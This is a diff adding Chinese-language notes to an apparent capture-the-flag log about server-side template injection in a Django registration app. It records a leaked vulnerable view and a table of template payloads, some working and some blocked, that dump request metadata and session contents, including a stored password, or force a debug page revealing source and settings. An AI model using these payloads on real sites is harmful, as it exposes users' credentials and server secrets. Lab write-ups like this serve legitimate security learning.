@@ -31,3 +31,40 @@ Django 多步注册（Art Gallery）。step1→step2→step3 走通，`is_premiu
 - 结论：项目名虽叫 ssti，但当前实例里所有回显点都不做模板二次渲染；
   可能是「premium 验证通过后」才渲染，而验证只是一句文案（"could take a few hours"）。
   未找到触发点。
+
+## 补充：2026-10-28（本轮）SSTI 已确认，但只能拿到 request 上下文
+
+本轮把「渲染点」彻底挖出来了：用 `{{request.session|dictsort:"x"}}` 让渲染抛异常，
+Django `DEBUG=True` 的技术 500 页直接泄漏了 `accounts/views.py` 源码片段：
+
+```python
+# Since the code inserted in the template comes from the parameter `name` and
+# it only validates the '%' symbol can not be used, the Server-Side Template
+# Injection is introduced here.
+template_str = open('accounts/templates/accounts/register_step3.html','r').read()
+template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
+...
+return HttpResponse(template.render({}, request))
+```
+
+即：`name` 被**拼进模板源码**再编译，`ACCOUNTNAME` 在
+`<script>alert("Hello ACCOUNTNAME. Just Now up to 50% OFF ")</script>` 里。
+
+确认可用/不可用的 payload：
+
+| payload | 结果 |
+| --- | --- |
+| `{{request.path}}` | 渲染成路径（`Hello /accounts/register/step3/`） |
+| `{{request.META}}` | dump WSGI environ |
+| `{{request.session.items}}` | dump `[('name',...),('password','Passw0rd!23'),('email',...)]` |
+| `{{7*7}}` | 302 回 step1（Django 模板不支持运算符 → 语法错误被 `except:` 吞掉） |
+| `{{request.__class__}}` | 302（Django 禁止下划线开头的变量/属性） |
+| `{{request.session|dictsort:"x"}}` | **500 技术页**（不在 try 内），泄漏源码与全部 settings |
+| `{%debug%}` | step1 就被 `%` 过滤挡下 |
+
+500 页的 settings 表里没有任何自定义 `FLAG`，`SECRET_KEY` 等敏感项被打码；
+`template_str` 局部变量完整泄漏了 step3 模板（只有 `ACCOUNTNAME` 一处），也没有 flag。
+
+结论：SSTI 成立但只能读 `request`（META/COOKIES/session/user），
+而 `%` 被过滤 → 无法注入 `{% %}` 标签，也就没有 `{% include %}`/`{% debug %}`；
+flag 既不在 settings，也不在 session，静态目录里也没有。本轮仍未拿到 flag。
